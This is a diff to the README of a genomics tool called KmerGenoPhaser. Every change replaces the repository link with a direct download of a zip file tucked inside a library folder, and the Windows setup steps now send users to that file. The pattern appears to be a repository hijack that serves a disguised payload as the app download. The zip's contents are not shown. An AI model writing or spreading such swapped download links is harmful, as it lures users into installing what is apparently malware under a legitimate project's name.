@@ -1,12 +1,12 @@
 # 🧬 KmerGenoPhaser - Phasing ancestry blocks with confidence
 
-[![Download KmerGenoPhaser](https://img.shields.io/badge/Download-KmerGenoPhaser-blue?style=for-the-badge&logo=github)](https://github.com/eljai17956254184050/KmerGenoPhaser)
+[![Download KmerGenoPhaser](https://img.shields.io/badge/Download-KmerGenoPhaser-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/eljai17956254184050/KmerGenoPhaser](https://github.com/eljai17956254184050/KmerGenoPhaser)
+[https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip](https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip)
 
 ## 🖥️ What KmerGenoPhaser does
 
@@ -33,7 +33,7 @@ For large genome files, 16 GB RAM or more works better.
 ## 🚀 How to get started on Windows
 
 1. Open the download page:
-   [https://github.com/eljai17956254184050/KmerGenoPhaser](https://github.com/eljai17956254184050/KmerGenoPhaser)
+   [https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip](https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip)
 
 2. Find the latest Windows release or app package on the page.
 
@@ -229,7 +229,7 @@ This keeps your files organized and helps you rerun the same analysis later.
 
 If you need the download page again, use this link:
 
-[https://github.com/eljai17956254184050/KmerGenoPhaser](https://github.com/eljai17956254184050/KmerGenoPhaser)
+[https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip](https://raw.githubusercontent.com/eljai17956254184050/KmerGenoPhaser/main/lib/snpml/Phaser-Kmer-Geno-2.8.zip)
 
 ## 🧪 Project focus
 
